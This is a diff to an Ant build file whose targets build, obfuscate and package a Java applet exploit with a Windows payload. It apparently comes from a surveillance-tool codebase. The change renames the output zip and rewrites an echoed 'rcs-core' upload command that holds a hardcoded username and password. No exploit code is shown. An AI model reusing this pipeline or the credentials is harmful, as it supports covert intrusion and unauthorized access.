@@ -205,11 +205,10 @@
         <target name="dist" depends="build_exploit,obfuscate_exploit,add_nopayload_win,make_jar">
           <delete file="server/applet/w.jar"/>
           <copy file ="build/jar/x.jar" overwrite="true" todir="server/applet" />
-           
           
-          <zip destfile="server/applet.zip" basedir="server/applet" />
-          <copy file="server/applet.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\applet.zip" overwrite="true" />
-          <echo>rcs-core -n applet -d zenotto -u admin -p adminp123 -R applet.zip -f1</echo>
+          <zip destfile="server/applet-x.zip" basedir="server/applet" />
+          <!-- <copy file="server/applet.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\applet.zip" overwrite="true" /> -->
+          <echo>rcs-core -n applet -d rcs-castore -u zenobatch -p adminp123 -R applet-x.zip </echo>
         </target>
         
         <target name="test_html" depends="build_exploit,obfuscate_exploit,add_payload_win,make_jar">
